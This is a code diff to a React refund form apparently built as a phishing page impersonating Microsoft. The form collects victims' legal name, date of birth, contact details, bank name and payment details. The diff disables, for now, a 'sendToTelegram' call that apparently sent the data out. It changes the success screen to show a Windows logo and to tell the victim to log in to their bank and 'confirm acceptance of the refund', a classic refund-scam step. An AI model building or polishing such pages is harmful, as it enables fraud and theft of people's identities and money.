@@ -198,16 +198,60 @@ export default function RefundForm() {
 
     setIsSubmitting(true)
 
-    const success = await sendToTelegram()
-    
-    if (success) {
-      setSubmitSuccess(true)
-    }
+    // TODO: Enable Telegram sending when ready
+    // const success = await sendToTelegram()
+    // if (success) {
+    //   setSubmitSuccess(true)
+    // }
+
+    // Temporarily disabled - just show success message
+    setSubmitSuccess(true)
 
     setIsSubmitting(false)
   }
 
+  const handleSubmitAnother = () => {
+    setSubmitSuccess(false)
+    setFormData({
+      fullLegalName: '',
+      dateOfBirth: '',
+      microsoftEmail: '',
+      alternateEmail: '',
+      phoneNumber: '',
+      billingAddress: '',
+      customerType: '',
+      productName: '',
+      skuId: '',
+      orderNumber: '',
+      purchaseChannel: '',
+      productCategory: '',
+      purchaseDate: '',
+      amountPaid: '',
+      currency: '',
+      paymentMethod: '',
+      bankName: '',
+      refundAmount: '',
+      refundReasons: {
+        accidentalPurchase: false,
+        duplicateCharge: false,
+        productNotAsDescribed: false,
+        technicalIssues: false,
+        subscriptionCancellation: false,
+        billingError: false,
+        other: false,
+      },
+      detailedExplanation: '',
+      policyAcknowledgment: false,
+      customerDeclaration: false,
+      customerSignature: '',
+      signatureDate: '',
+      customerNamePrinted: '',
+    })
+  }
+
   if (submitSuccess) {
+    const referenceNumber = Date.now().toString().toUpperCase()
+    
     return (
       <>
         <header className="header">
@@ -227,15 +271,30 @@ export default function RefundForm() {
         <main className="main-container">
           <div className="refund-card">
             <div className="success-content">
-              <div className="success-icon">✓</div>
-              <h2 className="success-title">Request Submitted Successfully</h2>
+              <Image 
+                src="/windows-logo.png" 
+                alt="Windows" 
+                width={80} 
+                height={80}
+                className="success-logo"
+              />
+              <h2 className="success-title">✓ THANK YOU!</h2>
               <p className="success-text">
-                Your refund request has been submitted and is being reviewed by our team. 
-                You will receive a confirmation email shortly.
+                Your refund request has been successfully submitted.
               </p>
               <p className="success-reference">
-                Reference: REF-{Date.now().toString(36).toUpperCase()}
+                Reference number#: {referenceNumber}
               </p>
+              <p className="success-instruction">
+                Kindly log in to your bank account and confirm acceptance of the refund using the reference number provided.
+              </p>
+              <button 
+                type="button" 
+                className="submit-button"
+                onClick={handleSubmitAnother}
+              >
+                Submit Another Request
+              </button>
             </div>
           </div>
         </main>
